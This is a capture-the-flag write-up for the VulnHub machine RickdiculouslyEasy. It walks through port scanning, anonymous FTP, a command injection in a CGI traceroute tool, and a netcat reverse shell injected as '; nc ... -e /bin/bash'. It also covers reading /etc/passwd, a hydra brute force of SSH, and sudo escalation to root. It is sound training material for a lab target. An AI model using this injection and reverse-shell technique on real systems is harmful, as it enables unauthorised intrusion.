RICKDICULOUSLYEASY #1 Write Up
https://www.vulnhub.com/entry/rickdiculouslyeasy-1,207/

This CTF works on getting to 130 points, so we need to find every flag until it adds up to 130.

Step 1: NMAP
POINTS = 0

Starting with the nmap command to identify the ip and open ports of the target machine.
nmap -sS -sV -p- 10.0.0.24

Nmap scan report for 10.0.0.22
Host is up (0.00010s latency).
Not shown: 65528 closed tcp ports (reset)
PORT      STATE SERVICE VERSION
21/tcp    open  ftp     vsftpd 3.0.3
22/tcp    open  ssh?
80/tcp    open  http    Apache httpd 2.4.27 ((Fedora))
9090/tcp  open  http    Cockpit web service 161 or earlier
13337/tcp open  unknown
22222/tcp open  ssh     OpenSSH 7.5 (protocol 2.0)
60000/tcp open  unknown

Step 2: PORT 21 | FTP 
POINTS = 0

Since we don't a user and password we can't log into FTP, but if enabled there is an option
in FTP whiche allows to enter as an anonymous user and thuse requires no password.
And It Worked...
We can get our first flag.

FLAG{Whoa this is unexpected} - 10 Points

Step 3: PORT 22 | SSH?
POINTS = 10

After using NMAP to find open ports on our target, we get a question mark next to the SSH protocol on port 22.
This means there is something other then SSH running on this port, we get an error beacuse port 22 is usually saved 
for the SSH protocol, and so we can't use SSH on port 22.
But we can see that SSH is also running on port 22222 with no qustion mark, this probebly means that this port 
is running the SSH protocol.

Before going into HTTP let's try some other odd ports.

Step 4: PORT 13337
POINTS = 20

Port 13337 is not a very common port and so it must have something interting behind it.
Using telnet to find more information about this port...

telnet 10.0.0.22 13337

We get another flag.

FLAG:{TheyFoundMyBackDoorMorty} - 10 Points

Step 5: PORT 60000
POINTS = 30

Once again using telnet to find more information about the port, we suprisingly get this message:
Welcome to Ricks half baked reverse shell...
#

Using the whoami command we can see that we see that we are the root user and find another FLAG.

FLAG{Flip the pickle Morty!} - 10 Points

Trying to change directory to /root, prompts "Permission Denied" and thuse for every command exepct whoami and ls.
This means that we are not really the root user and there is nothing more we can do in this reverse shell.

Step 6: PORT 9090 | ZEUS ADMIN
POINTS = 40

NMAP says PORT 9090 is using HTTP
After googling what PORT 9090 is, it says Zeus is an old web server. It can also be many other TCP based services.
So going to http://10.0.0.22:9090 
We get another FLAG:

FLAG {There is no Zeus, in your face!} - 10 Points

Step 7: PORT 80 | HTTP
POINTS = 50

Going into the http://10.0.0.22 we are greeted with a picture of Morty.
There are no hyperlinks and no buttons and by going into the develpor tools we don't see anything that can help us.
Using a tool named dirsearch we can know if there are more directorys and files inside the site.
And indeed there are: 

/passwords/
robots.txt

Going into http://10.0.0.22/passwords/ we get yet again another flag:

FLAG{Yeah d- just don't do it.} - 10 Points

There is also a passwords.html file that displays:

"Wow Morty real clever. Storing passwords in a file called passwords.html? 
You've really done it this time Morty. Let me at least hide them.. I'd delete them entirely but I know you'd go bitching to your mom. 
That's the last thing I need."

Using develepor tools get a comment:

<!--Password: winter-->

Now we got a password, winter.

Going into http://10.0.0.22/robots.txt we get this message:

They're Robots Morty! It's ok to shoot them! They're just Robots!

/cgi-bin/root_shell.cgi
/cgi-bin/tracertool.cgi
/cgi-bin/*

We found that the web server has the cgi-bin directory, the cgi-bin folder is responsible for executing an external program.
By going to /cgi-bin/root_shell.cgi it says its  

--UNDER CONSTRUCTION-- 

By using develepor tools we can see 2 comments:
<!--HAAHAHAHAAHHAaAAAGGAgaagAGAGAGG-->
<!--I'm sorry Morty. It's a bummer.--> 

We cannot get anything from this program.

Going into /cgi/bin/tracertool.cgi we get MORTY'S MACHINE TRACER MACHINE and an input box.
Typing an IP executes the traceroute command and displays it output.
We may able to inject some commands into this by trying to use ;.
Entering "; whoami" outputs "apache", IT WORKS!.
Now we can try a reverse shell.

Step 8: REVERSE SHELL
POINTS = 50

Local Machine:
nc -lnvp 4444

Target Machine:
; nc 10.0.0.18 4444 -e /bin/bash

And we get a connection, using "whoami" to see what user is running and we get the apache user.
Trying to use cat to read the /etc/passwd file does not seem to work, instead it prints an ascii banner of a cat, pretty cool 
but not helpful.
We can try using the tail or head command, since the users are stored at the bottom of the /etc/passwd file we'll use tail.
We get another 3 users:

Summer
Morty
RickSanchez

Step 9: PORT 22222 | REAL SSH
POINTS = 50

Now that we have a password and some usernames we can try loging to the machine via ssh.

Morty does not seem to work, so is RickSanchez, but we get a connection with Summer.

ssh Summer@10.0.0.22 -p 
Summer@10.0.0.22's password: "winter"

Ah get it , winter summer, never mind.

We got another FLAG:

FLAG{Get off the high road Summer!} - 10 Points

Going into the /home folder we see there are 3 directorys, Morty, RickSanchez and Summer.
The Morty directory has a .jpg and a zip file.
Opening the .jpg we see a photo of Rick, nothing on the surface but using the strings command we see an intersting string.

"The Safe Password: File: /home/Morty/journal.txt.zip. Password: Meeseek"

This leads us to the .zip file, to unzip it we must enter a password, entering the found password and we get a .txt file which reads:

Monday: So today Rick told me huge secret. He had finished his flask and was on to commercial grade paint solvent. He spluttered something about a safe, and a password. Or maybe it was a safe password... Was a password that was safe? Or a password to a safe? Or a safe password to a safe?

Anyway. Here it is:

FLAG: {131333} - 20 Points

The RickSanchez directory contains 2 more directorys, changing to the ThisDoesntContainAnyFlags dir, we find out that
there are no flags. Suprising. :3

The second dir is RICKS_SAFE, it contains an exectuable named safe, after attamping to execute it, we find 
out that we don't have permissions.

But we can download it to our local machine.
once executing it we get:

"Past Rick to present Rick, tell future Rick to use GOD DAMN COMMAND LINE AAAAAHHAHAGGGGRRGUMENTS!"

We found a password eariler in the flag: 131333. If we try to pass the password as an argmuent to ./safe, we get a FLAG.

FLAG{And Awwwaaaaayyyy we Go!} - 20 Points 

And this message: 

"Ricks password hints:
 (This is incase I forget.. I just hope I don't forget how to write a script to generate potential passwords. Also, sudo is wheely good.)
Follow these clues, in order

1 uppercase character
1 digit
One of the words in my old bands name."

Step 10: BRUTE FORCE
POINTS = 100

Searching google for Rick's band, we find that his band's name was "The Flesh Curtains".
After making a python script that makes a a wordlist with the specified requiremnts:

1 uppercase character
1 digit
One of the words in my old bands name.

We can use hydra to brute force with the wordlist and get a password.
Trying to brute force the root user did not work, but the RickSanchez was a success, the password is:

P7Curtains

Now we the password for RickSanchez and we can log in.
Using sudo -l to see if we have permissions, and we see that we can have full permissions.

Step 11: ROOT USER
Running the "su" as with and we have access to the root user and we read the final FLAG.

FLAG: {Ionic Defibrillator} - 30 points

And with 130 points and 0 more to go the CTF is officaily completed.